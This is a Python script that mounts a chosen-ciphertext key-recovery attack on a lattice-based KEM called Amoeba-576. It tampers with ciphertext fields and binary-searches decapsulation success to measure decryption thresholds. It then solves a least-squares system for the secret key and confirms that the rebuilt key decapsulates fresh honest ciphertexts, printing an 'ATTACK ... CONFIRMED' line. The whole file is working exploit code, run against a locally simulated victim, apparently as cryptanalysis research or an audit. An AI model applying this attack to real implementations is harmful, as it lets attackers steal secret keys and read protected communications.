#!/usr/bin/env python3
"""Experimental chosen-ciphertext oracle for Amoeba-576.

Uses only the public key, attacker-chosen plaintext/encryption coins, and the
submitted decapsulation output when querying the victim. The secret key is
retained locally only to score a later recovery experiment.
Run with the Sage environment's Python (NumPy is required).
"""

import argparse
import ctypes as C
from pathlib import Path
import random
import time

import numpy as np
from scipy.sparse.linalg import LinearOperator, lsqr

HERE = Path(__file__).resolve().parent
LIB = HERE / "lib/libAmoeba128_attack.so"
Q = 3457
N = 576
CT_LEN = 1047
PK_LEN = 784
SK_LEN = 1712
U_LEN = 720
V_BITS = 5


def buf(data):
    return (C.c_ubyte * len(data)).from_buffer_copy(data)


def unpack(data, bitpos, width):
    return sum(((data[(bitpos + i) // 8] >> (7 - ((bitpos + i) % 8))) & 1)
               << (width - 1 - i) for i in range(width))


def setfield(data, bitpos, width, value):
    for i in range(width):
        p = bitpos + i
        mask = 1 << (7 - (p % 8))
        if value & (1 << (width - 1 - i)):
            data[p // 8] |= mask
        else:
            data[p // 8] &= ~mask


def eligible(index):
    return all(((U_LEN + (index * V_BITS + i) // 8) % 4) != 0
               for i in range(V_BITS))


def vlevel(ct, index):
    return unpack(ct, U_LEN * 8 + index * V_BITS, V_BITS)


class Amoeba:
    def __init__(self):
        self.lib = C.CDLL(str(LIB))
        self.lib.ngcc_seed.argtypes = [C.c_void_p, C.c_ulonglong]
        self.lib.kem_keygen.argtypes = [C.c_void_p, C.c_void_p, C.c_void_p, C.c_void_p]
        self.lib.CPAPKE_Encrypt.argtypes = [C.c_void_p, C.c_void_p, C.c_void_p, C.c_void_p]
        self.lib.kem_dec.argtypes = [C.c_void_p, C.c_ulonglong, C.c_void_p,
                                     C.c_ulonglong, C.c_void_p, C.c_void_p]
        self.lib.sm3hash.argtypes = [C.c_int, C.c_void_p, C.c_ulonglong, C.c_void_p]
        self.lib.pseudoXOF.argtypes = [C.c_ulonglong, C.c_void_p,
                                       C.c_ulonglong, C.c_void_p]
        self.lib.InverseNussbamuer.argtypes = [C.c_void_p, C.c_void_p]
        self.lib.ForwardNussbamuer.argtypes = [C.c_void_p, C.c_void_p]
        self.lib.kem_enc.argtypes = [C.c_void_p, C.c_ulonglong, C.c_void_p,
                                    C.c_void_p, C.c_void_p, C.c_void_p]
        self.queries = 0

    def xof(self, data, length):
        out = (C.c_ubyte * length)()
        assert self.lib.pseudoXOF(length * 8, buf(data), len(data) * 8, out) == 0
        return bytes(out)

    def sm3(self, data):
        out = (C.c_ubyte * 32)()
        assert self.lib.sm3hash(256, buf(data), len(data) * 8, out) == 0
        return bytes(out)

    def keygen(self, seed):
        assert self.lib.ngcc_seed(buf(seed), len(seed)) == 0
        pk, sk = (C.c_ubyte * PK_LEN)(), (C.c_ubyte * SK_LEN)()
        pk_len, sk_len = C.c_ulonglong(), C.c_ulonglong()
        assert self.lib.kem_keygen(pk, C.byref(pk_len), sk, C.byref(sk_len)) == 0
        assert (pk_len.value, sk_len.value) == (PK_LEN, SK_LEN)
        return bytes(pk), bytes(sk)

    def chosen_ciphertext(self, pk, msg):
        state = bytearray(msg + b"\x00" + pk[64:128])
        kr = bytearray()
        while len(kr) < 128:
            kr += self.sm3(state)
            state[64] += 1
        ct = (C.c_ubyte * CT_LEN)()
        self.lib.CPAPKE_Encrypt(ct, buf(pk), buf(msg), buf(kr[64:128]))
        return bytes(ct), bytes(kr[:64]), bytes(kr[64:128])

    def decaps(self, sk, ct):
        out = (C.c_ubyte * 64)()
        out_len = C.c_ulonglong()
        rc = self.lib.kem_dec(buf(sk), SK_LEN, buf(ct), CT_LEN, out, C.byref(out_len))
        self.queries += 1
        return rc, bytes(out)

    def same_message(self, sk, ct, kr0):
        rc, got = self.decaps(sk, ct)
        return rc == 0 and got == self.xof(ct + kr0, 64)

    def cbd(self, coin, eta, label):
        state = bytearray(coin + bytes((label, 0)))
        f = np.zeros(864, dtype=np.int64)
        for _ in range(eta):
            left = np.unpackbits(np.frombuffer(self.xof(state, 108), dtype=np.uint8),
                                 bitorder="little").astype(np.int64)
            state[-1] += 1
            right = np.unpackbits(np.frombuffer(self.xof(state, 108), dtype=np.uint8),
                                  bitorder="little").astype(np.int64)
            state[-1] += 1
            f += left - right
        return np.concatenate((f[:288] - f[576:], f[288:576] + f[576:]))

    def parse_a(self, seed):
        out = []
        counter = 0
        while len(out) < N:
            arr = self.xof(seed + bytes((counter,)), 192)
            counter += 1
            for k in range(0, 192, 3):
                x1 = arr[k] + ((arr[k + 1] & 15) << 8)
                x2 = (arr[k + 1] >> 4) + (arr[k + 2] << 8)
                if x1 < Q:
                    out.append(x1)
                if len(out) < N and x2 < Q:
                    out.append(x2)
                if len(out) == N:
                    break
        return np.asarray(out, dtype=np.int64)

    def inverse(self, ntt):
        ntt = np.asarray(ntt, dtype=np.int16)
        output = (C.c_int16 * N)()
        self.lib.InverseNussbamuer(output, ntt.ctypes.data_as(C.c_void_p))
        return centered(np.asarray(output, dtype=np.int64))

    def secret_coefficients(self, sk):
        return self.inverse([unpack(sk, i * 12, 12) for i in range(N)])

    def recovered_key(self, coefficients, pk):
        natural = np.asarray(coefficients, dtype=np.int16)
        output = (C.c_int16 * N)()
        self.lib.ForwardNussbamuer(output, natural.ctypes.data_as(C.c_void_p))
        packed = bytearray(864)
        for j, value in enumerate(output):
            setfield(packed, j * 12, 12, int(value) % Q)
        # Rejection seed is intentionally unavailable; an honest ciphertext
        # must never take that path when the recovered CPA key is correct.
        return bytes(packed) + pk + bytes(64)

    def encaps(self, pk):
        ct, key = (C.c_ubyte * CT_LEN)(), (C.c_ubyte * 64)()
        ct_len, key_len = C.c_ulonglong(), C.c_ulonglong()
        assert self.lib.kem_enc(buf(pk), PK_LEN, key, C.byref(key_len),
                                ct, C.byref(ct_len)) == 0
        assert (ct_len.value, key_len.value) == (CT_LEN, 64)
        return bytes(ct), bytes(key)


def centered(values):
    values = np.asarray(values, dtype=np.int64) % Q
    return np.where(values > Q // 2, values - Q, values)


def product(a, b):
    tmp = np.zeros(2 * N - 1, dtype=np.int64)
    tmp[:] = np.convolve(a, b)
    for degree in range(2 * N - 2, N - 1, -1):
        tmp[degree - N] -= tmp[degree]
        tmp[degree - N // 2] += tmp[degree]
    return tmp[:N] % Q


def multiplication_matrix(a):
    out = np.zeros((2 * N - 1, N), dtype=np.int16)
    for k in range(N):
        out[k:k + N, k] = a
    for degree in range(2 * N - 2, N - 1, -1):
        row = out[degree].copy()
        out[degree - N] -= row
        out[degree - N // 2] += row
    return out[:N]


def decode_poly(data, bit_offset, width, count):
    levels = np.asarray([unpack(data, bit_offset + i * width, width)
                         for i in range(count)], dtype=np.int64)
    return (levels * Q + (1 << (width - 1))) >> width


def equation_block(kem, pk, ct, msg, coin, indices, transitions, truth=None):
    a = kem.inverse(kem.parse_a(pk[:64]))
    r = kem.cbd(coin, 2, 2)
    e1 = kem.cbd(coin, 2, 4)
    e2 = kem.cbd(coin, 2, 8)
    b = decode_poly(pk, 64 * 8, 10, N)
    u = decode_poly(ct, 0, 10, N)
    v = decode_poly(ct, U_LEN * 8, 5, 523)
    u_raw = (product(a, r) + e1) % Q
    v_raw = (product(b, r)[:523] + e2[:523]) % Q
    cu = centered(u - u_raw)
    # The ECC encoder is systematic in data positions 0..511.
    cv = centered(v[:512] - v_raw[:512] -
                  np.asarray([((msg[j // 8] >> (j % 8)) & 1) * (Q >> 1)
                              for j in range(512)], dtype=np.int64))
    if truth is not None:
        err = centered(b - product(a, truth))
        if not hasattr(equation_block, "shown"):
            equation_block.shown = True
            print(f"model check: public error max={np.max(np.abs(err))} "
                  f"u compression max={np.max(np.abs(cu))} "
                  f"v compression max={np.max(np.abs(cv))}", flush=True)
    rows = np.hstack((multiplication_matrix(-e1 - cu)[indices],
                      multiplication_matrix(r)[indices])).astype(np.float32)
    y = np.empty(len(indices), dtype=np.float32)
    for pos, j in enumerate(indices):
        t = transitions[pos]
        base = int(vlevel(ct, j))
        old = int(v[j])
        delta_before = (((((base + t - 1) & 31) * Q + 16) >> 5) - old) % Q
        delta_after = (((((base + t) & 31) * Q + 16) >> 5) - old) % Q
        # Both shifts are near +q/4, so select their positive representatives.
        estimate = 865 - (delta_before + delta_after) / 2
        y[pos] = estimate - int(e2[j]) - int(cv[j])
    if truth is not None and not hasattr(equation_block, "checked"):
        equation_block.checked = True
        actual = centered(rows @ np.concatenate((truth, err)) +
                          e2[indices] + cv[indices])
        estimate = y + e2[indices] + cv[indices]
        print(f"model check: delta max={np.max(np.abs(actual))} "
              f"measurement residual mean={np.mean(estimate - actual):.1f} "
              f"std={np.std(estimate - actual):.1f}", flush=True)
    return rows, y


def solve(blocks, truth):
    matrix = np.vstack([block[0] for block in blocks])
    rhs = np.concatenate([block[1] for block in blocks])
    operator = LinearOperator(matrix.shape,
                              matvec=lambda x: matrix @ x,
                              rmatvec=lambda y: matrix.T @ y,
                              dtype=np.float32)
    estimate = lsqr(operator, rhs, atol=1e-5, btol=1e-5,
                    iter_lim=100)[0]
    rounded = np.rint(estimate[:N]).astype(np.int64)
    hits = int(np.count_nonzero(rounded == truth))
    print(f"secret coefficients recovered={hits}/{N} "
          f"equations={len(rhs)}", flush=True)
    return rounded


def changed(ct, changes):
    out = bytearray(ct)
    for index, offset in changes:
        level = (vlevel(ct, index) + offset) & 31
        setfield(out, U_LEN * 8 + index * V_BITS, V_BITS, level)
    return bytes(out)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ciphertexts", type=int, default=80)
    ap.add_argument("--targets", type=int, default=320)
    ap.add_argument("--recover", action="store_true")
    ap.add_argument("--seed", type=int, default=1,
                    help="reproducible experiment seed")
    args = ap.parse_args()
    rng = random.Random(args.seed)
    kem = Amoeba()
    pk, sk = kem.keygen(rng.randbytes(48))
    indices = [j for j in range(512) if eligible(j)]
    # The external parity position gives a two-error oracle while keeping the
    # submitted ECC decoder on its in-bounds branch for every data position.
    anchor, targets = 522, indices[:args.targets]
    assert eligible(anchor)
    print(f"eligible data coordinates={len(indices)} anchor={anchor}", flush=True)
    started = time.monotonic()
    measured = []
    blocks = []
    truth = kem.secret_coefficients(sk) if args.recover else None
    recovered = None
    for sample in range(args.ciphertexts):
        msg = rng.randbytes(64)
        ct, kr0, coin = kem.chosen_ciphertext(pk, msg)
        assert kem.same_message(sk, ct, kr0), "baseline is not a valid FO ciphertext"
        assert kem.same_message(sk, changed(ct, [(anchor, 16)]), kr0), "anchor not corrected"
        if sample == 0:
            checked = bytearray(ct)
            checked[0] ^= 1
            assert not kem.same_message(sk, bytes(checked), kr0), "checked-byte control accepted"
        transitions = []
        for j in targets:
            def positive(t):
                return kem.same_message(sk, changed(ct, [(anchor, 16), (j, t)]), kr0)

            if positive(16):
                raise AssertionError(f"target {j} did not flip")
            lo, hi = 0, 16
            while hi - lo > 1:
                mid = (lo + hi) // 2
                if positive(mid):
                    lo = mid
                else:
                    hi = mid
            measured.append((sample, j, hi))
            transitions.append(hi)
        if args.recover:
            blocks.append(equation_block(kem, pk, ct, msg, coin, targets, transitions, truth))
            if (sample + 1) in (5, 10, 20, 40, 80, args.ciphertexts):
                recovered = solve(blocks, truth)
        print(f"ciphertext={sample + 1} measured={len(measured)} queries={kem.queries} "
              f"elapsed={time.monotonic() - started:.2f}s", flush=True)
    print("first transitions:", measured[:12])
    print(f"rate={kem.queries / (time.monotonic() - started):.1f} decaps/s")
    if args.recover:
        replacement_sk = kem.recovered_key(recovered, pk)
        successes = 0
        for _ in range(10):
            honest_ct, honest_key = kem.encaps(pk)
            rc, derived = kem.decaps(replacement_sk, honest_ct)
            successes += (rc == 0 and derived == honest_key)
        print(f"fresh honest encapsulations decapsulated={successes}/10 "
              f"without original secret-key bytes", flush=True)
        if successes == 10 and np.array_equal(recovered, truth):
            print(f"ATTACK kem-02-1 Amoeba-576 CONFIRMED "
                  f"queries={kem.queries - 10} coefficients={N}/{N} "
                  f"fresh_shared_secrets=10/10", flush=True)
        else:
            raise SystemExit("key recovery incomplete; no confirmed verdict")


if __name__ == "__main__":
    main()
